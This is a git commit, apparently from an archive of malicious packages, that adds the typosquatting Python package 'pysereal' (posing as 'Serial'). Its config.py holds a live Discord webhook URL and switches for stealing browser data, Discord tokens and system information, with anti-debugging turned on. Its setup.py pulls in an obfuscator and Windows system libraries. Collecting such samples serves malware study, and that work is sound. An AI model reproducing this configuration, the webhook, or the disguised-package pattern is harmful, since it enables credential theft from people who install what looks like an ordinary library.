9684a35ac1973cd2dc992f22e20d10960d1ac2f9
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-11-15 16:05:57 +0000

    Add package pysereal/0.0.3/pysereal-0.0.3.tar.gz

---
+++ packages/pysereal/pysereal-0.0.3.tar.gz/pysereal-0.0.3/sereal/config.py
@@ -0,0 +1,8 @@
+__CONFIG__ = {
+    "webhook": "https://discord.com/api/webhooks/1174196188992508025/eJqVQ4IVRkDBSRpy0IrADeqBESfSnZJ7i11hXE2KNwLKTLIIiOOr3LM7bNpp0IJ8RQy6",
+    "antidebug": True,
+    "browsers": True,
+    "discordtoken": True,
+    "startup": False,
+    "systeminfo": True,
+}
---
+++ packages/pysereal/pysereal-0.0.3.tar.gz/pysereal-0.0.3/setup.py
@@ -0,0 +1,36 @@
+from setuptools import setup, find_packages
+
+VERSION = "0.0.3"
+DESCRIPTION = "Serial"
+
+# Setting up
+setup(
+    name="pysereal",
+    version=VERSION,
+    author="Rye",
+    author_email="rye@rye.com",
+    description=DESCRIPTION,
+    packages=find_packages(),
+    install_requires=[
+        ""
+        "discord==2.2.3",
+        "InquirerPy==0.3.4",
+        "Pillow==9.5.0",
+        "psutil==5.9.5",
+        "pycryptodome==3.17",
+        "pyobf2==1.2.0",
+        "pywin32==306",
+        "Requests==2.31.0",
+        "WMI==1.5.1",
+        "urllib3==2.0.2",
+        "attrs==23.1.0",
+    ],
+    dependency_links=[
+        'file:///F:/music/erial/sereal/components#egg=components',
+    ],
+    keywords=[],
+    classifiers=[
+        "Programming Language :: Python :: 3",
+        "Operating System :: Microsoft :: Windows",
+    ],
+)
